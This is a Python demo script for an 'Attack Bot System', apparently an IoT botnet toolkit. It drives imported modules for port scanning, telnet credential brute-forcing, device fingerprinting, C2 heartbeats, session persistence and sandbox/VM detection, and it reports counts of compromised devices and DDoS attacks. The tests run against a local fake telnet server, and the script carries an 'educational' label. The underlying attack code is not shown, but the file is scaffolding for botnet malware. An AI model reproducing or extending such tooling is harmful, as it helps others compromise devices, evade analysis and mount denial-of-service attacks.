#!/usr/bin/env python3
"""
Attack Bot System Demo
Educational/Research Purpose Only

This script demonstrates the capabilities of the attack bot system
in a safe, controlled environment.
"""

import sys
import os
import time
import threading
import socket
import subprocess
from datetime import datetime

# Add the current directory to the path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

class DemoEnvironment:
    """Create a safe demo environment"""
    
    def __init__(self):
        self.demo_servers = []
        self.demo_running = False
    
    def start_demo_telnet_server(self, port=2323):
        """Start a demo telnet server for testing"""
        def telnet_server():
            try:
                server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                server_socket.bind(('127.0.0.1', port))
                server_socket.listen(1)
                
                print(f"[*] Demo telnet server started on port {port}")
                
                while self.demo_running:
                    try:
                        client_socket, addr = server_socket.accept()
                        print(f"[*] Demo connection from {addr}")
                        
                        # Send banner
                        client_socket.send(b"Demo IoT Device v1.0\nlogin: ")
                        
                        # Wait for login
                        data = client_socket.recv(1024)
                        if b"admin" in data.lower():
                            client_socket.send(b"Password: ")
                            data = client_socket.recv(1024)
                            if b"admin" in data.lower():
                                client_socket.send(b"Welcome to demo device!\n# ")
                                # Keep connection alive briefly
                                time.sleep(2)
                        
                        client_socket.close()
                    except:
                        break
                
                server_socket.close()
            except Exception as e:
                print(f"[!] Demo server error: {e}")
        
        self.demo_running = True
        thread = threading.Thread(target=telnet_server, daemon=True)
        thread.start()
        self.demo_servers.append(thread)
    
    def stop_demo_servers(self):
        """Stop all demo servers"""
        self.demo_running = False
        print("[*] Stopping demo servers...")

class AttackBotDemo:
    """Demo controller for the attack bot system"""
    
    def __init__(self):
        self.demo_env = DemoEnvironment()
    
    def show_banner(self):
        """Display demo banner"""
        banner = """
╔══════════════════════════════════════════════════════════════╗
║                ATTACK BOT SYSTEM DEMONSTRATION              ║
║                  Educational/Research Use Only              ║
╠══════════════════════════════════════════════════════════════╣
║  This demo shows the attack bot system capabilities in a    ║
║  safe, controlled environment using local demo servers.     ║
╚══════════════════════════════════════════════════════════════╝
        """
        print(banner)
    
    def demo_scanner(self):
        """Demonstrate network scanning capabilities"""
        print("\n" + "="*60)
        print("NETWORK SCANNING DEMONSTRATION")
        print("="*60)
        
        try:
            from scanner import NetworkScanner
            scanner = NetworkScanner()
            
            print("[*] Initializing network scanner...")
            print("[*] Scanning localhost for common ports...")
            
            # Scan common ports on localhost
            ports = [21, 22, 23, 80, 443, 2323, 8080]
            results = scanner.scan_ports("127.0.0.1", ports)
            
            print(f"[+] Scan completed! Found {len(results)} open ports:")
            for result in results:
                print(f"    Port {result['port']}: {result['state']}")
            
            print("\n[*] Demonstrating service detection...")
            for result in results:
                if result['state'] == 'open':
                    services = scanner.detect_services("127.0.0.1", [result['port']])
                    if services:
                        print(f"    Port {result['port']}: {services[0].get('service', 'unknown')}")
            
        except Exception as e:
            print(f"[!] Scanner demo failed: {e}")
    
    def demo_bruteforce(self):
        """Demonstrate brute force capabilities"""
        print("\n" + "="*60)
        print("BRUTE FORCE DEMONSTRATION")
        print("="*60)
        
        # Start demo telnet server
        print("[*] Starting demo telnet server...")
        self.demo_env.start_demo_telnet_server(2323)
        time.sleep(1)
        
        try:
            from bruteforce import TelnetBruteForcer
            bruteforcer = TelnetBruteForcer()
            
            print("[*] Initializing brute force module...")
            print(f"[*] Loaded {len(bruteforcer.credentials)} credential pairs")
            print("[*] Attempting brute force attack on demo server...")
            
            # Attempt brute force on demo server
            success, credentials = bruteforcer.attack("127.0.0.1", 2323)
            
            if success:
                print(f"[+] Success! Credentials found: {credentials}")
            else:
                print("[-] No valid credentials found")
            
        except Exception as e:
            print(f"[!] Brute force demo failed: {e}")
    
    def demo_device_fingerprinting(self):
        """Demonstrate device fingerprinting"""
        print("\n" + "="*60)
        print("DEVICE FINGERPRINTING DEMONSTRATION")
        print("="*60)
        
        try:
            from exploit import ExploitController
            controller = ExploitController()
            
            print("[*] Demonstrating device fingerprinting...")
            
            # Fingerprint localhost
            fingerprint = controller.fingerprint_device("127.0.0.1", 2323)
            
            print("[+] Fingerprint results:")
            print(f"    Host: {fingerprint['host']}")
            print(f"    Device Type: {fingerprint['device_type']}")
            print(f"    OS Guess: {fingerprint['os_guess']}")
            print(f"    Open Ports: {fingerprint.get('open_ports', [])}")
            
            if 'banner' in fingerprint:
                print(f"    Banner: {fingerprint['banner'][:50]}...")
            
        except Exception as e:
            print(f"[!] Fingerprinting demo failed: {e}")
    
    def demo_c2_communication(self):
        """Demonstrate C2 communication"""
        print("\n" + "="*60)
        print("C2 COMMUNICATION DEMONSTRATION")
        print("="*60)
        
        try:
            from c2_communication import C2Communication
            
            print("[*] Initializing C2 communication...")
            c2_comm = C2Communication("127.0.0.1", 8080, "demo_bot_001")
            
            print(f"[*] Bot ID: {c2_comm.bot_id}")
            print(f"[*] C2 Server: {c2_comm.c2_host}:{c2_comm.c2_port}")
            
            # Simulate heartbeat
            status = {
                'bot_id': c2_comm.bot_id,
                'status': 'active',
                'compromised_count': 0,
                'timestamp': datetime.now().isoformat()
            }
            
            print("[*] Attempting to send heartbeat to C2 server...")
            print("    (Note: This will fail if C2 server is not running)")
            
            try:
                c2_comm.send_heartbeat(status)
                print("[+] Heartbeat sent successfully")
            except:
                print("[-] C2 server not available (expected in demo)")
            
        except Exception as e:
            print(f"[!] C2 communication demo failed: {e}")
    
    def demo_session_management(self):
        """Demonstrate session management"""
        print("\n" + "="*60)
        print("SESSION MANAGEMENT DEMONSTRATION")
        print("="*60)
        
        try:
            from session_manager import SessionManager
            
            print("[*] Demonstrating session management...")
            session_manager = SessionManager("demo_session")
            
            # Store some demo data
            session_manager.update_session('demo_data', {
                'last_scan': datetime.now().isoformat(),
                'targets_found': 5,
                'exploits_attempted': 3
            })
            
            print("[+] Session data stored:")
            print(f"    Session ID: {session_manager.bot_id}")
            print(f"    Data keys: {list(session_manager.session_data.keys())}")
            
            # Save session
            session_manager.save_session()
            print("[+] Session saved to disk")
            
        except Exception as e:
            print(f"[!] Session management demo failed: {e}")
    
    def demo_evasion_techniques(self):
        """Demonstrate evasion techniques"""
        print("\n" + "="*60)
        print("EVASION TECHNIQUES DEMONSTRATION")
        print("="*60)
        
        try:
            from exploit import ExploitController
            controller = ExploitController()
            
            print("[*] Demonstrating evasion techniques...")
            
            # Test analysis environment detection
            is_analysis = controller._detect_analysis_environment()
            print(f"[*] Analysis environment detected: {'Yes' if is_analysis else 'No'}")
            
            # Show bot ID generation (for uniqueness)
            print(f"[*] Generated bot ID: {controller.bot_id}")
            
            # Demonstrate timing randomization
            print("[*] Evasion mechanisms would include:")
            print("    - Process name obfuscation")
            print("    - Network timing randomization")
            print("    - Anti-debugging techniques")
            print("    - VM detection and evasion")
            
        except Exception as e:
            print(f"[!] Evasion demo failed: {e}")
    
    def demo_statistics(self):
        """Show system statistics"""
        print("\n" + "="*60)
        print("SYSTEM STATISTICS")
        print("="*60)
        
        try:
            from exploit import ExploitController
            controller = ExploitController()
            
            print("[*] System Statistics:")
            print(f"    Bot ID: {controller.bot_id}")
            print(f"    Uptime Start: {controller.stats['uptime_start']}")
            print(f"    Scans Performed: {controller.stats['scans_performed']}")
            print(f"    Devices Compromised: {controller.stats['devices_compromised']}")
            print(f"    DDoS Attacks: {controller.stats['ddos_attacks']}")
            
            print("\n[*] Configuration:")
            print(f"    Scan Threads: {controller.scan_threads}")
            print(f"    Scan Timeout: {controller.scan_timeout}")
            print(f"    Exploit Delay: {controller.exploit_delay}")
            print(f"    Persistence Enabled: {controller.persistence_enabled}")
            print(f"    Evasion Enabled: {controller.evasion_enabled}")
            
        except Exception as e:
            print(f"[!] Statistics demo failed: {e}")
    
    def interactive_demo(self):
        """Run interactive demo"""
        print("\n" + "="*60)
        print("INTERACTIVE DEMO MODE")
        print("="*60)
        
        while True:
            print("\nAvailable demonstrations:")
            print("1. Network Scanning")
            print("2. Brute Force Attack")
            print("3. Device Fingerprinting")
            print("4. C2 Communication")
            print("5. Session Management")
            print("6. Evasion Techniques")
            print("7. System Statistics")
            print("8. Run All Demos")
            print("9. Exit")
            
            try:
                choice = input("\nSelect demo (1-9): ").strip()
                
                if choice == '1':
                    self.demo_scanner()
                elif choice == '2':
                    self.demo_bruteforce()
                elif choice == '3':
                    self.demo_device_fingerprinting()
                elif choice == '4':
                    self.demo_c2_communication()
                elif choice == '5':
                    self.demo_session_management()
                elif choice == '6':
                    self.demo_evasion_techniques()
                elif choice == '7':
                    self.demo_statistics()
                elif choice == '8':
                    self.run_all_demos()
                elif choice == '9':
                    break
                else:
                    print("[!] Invalid choice. Please select 1-9.")
                
                input("\nPress Enter to continue...")
                
            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"[!] Demo error: {e}")
    
    def run_all_demos(self):
        """Run all demonstrations in sequence"""
        print("\n" + "="*60)
        print("RUNNING ALL DEMONSTRATIONS")
        print("="*60)
        
        demos = [
            ("Network Scanning", self.demo_scanner),
            ("Brute Force Attack", self.demo_bruteforce),
            ("Device Fingerprinting", self.demo_device_fingerprinting),
            ("C2 Communication", self.demo_c2_communication),
            ("Session Management", self.demo_session_management),
            ("Evasion Techniques", self.demo_evasion_techniques),
            ("System Statistics", self.demo_statistics)
        ]
        
        for name, demo_func in demos:
            print(f"\n[*] Running {name} demo...")
            try:
                demo_func()
                print(f"[+] {name} demo completed")
            except Exception as e:
                print(f"[!] {name} demo failed: {e}")
            
            time.sleep(1)  # Brief pause between demos
    
    def run(self):
        """Main demo runner"""
        self.show_banner()
        
        print("\nWelcome to the Attack Bot System demonstration!")
        print("This demo runs in a safe, controlled environment.")
        print("\nChoose demo mode:")
        print("1. Interactive (choose specific demos)")
        print("2. Automated (run all demos)")
        print("3. Exit")
        
        try:
            choice = input("\nSelect mode (1-3): ").strip()
            
            if choice == '1':
                self.interactive_demo()
            elif choice == '2':
                self.run_all_demos()
            elif choice == '3':
                print("[*] Exiting demo...")
                return
            else:
                print("[!] Invalid choice.")
                return
        
        except KeyboardInterrupt:
            print("\n[*] Demo interrupted by user")
        finally:
            self.demo_env.stop_demo_servers()
        
        print("\n[*] Demo completed. Thank you!")

def main():
    """Main entry point"""
    print("Attack Bot System Demo - Educational/Research Use Only")
    print("Copyright (c) 2025 - For Educational Purposes Only\n")
    
    # Check if we're in the right directory
    if not os.path.exists('exploit.py'):
        print("[!] Please run this demo from the exploit directory")
        print("    cd AttackBots/exploit && python demo.py")
        return 1
    
    # Run the demo
    demo = AttackBotDemo()
    demo.run()
    
    return 0

if __name__ == "__main__":
    sys.exit(main())
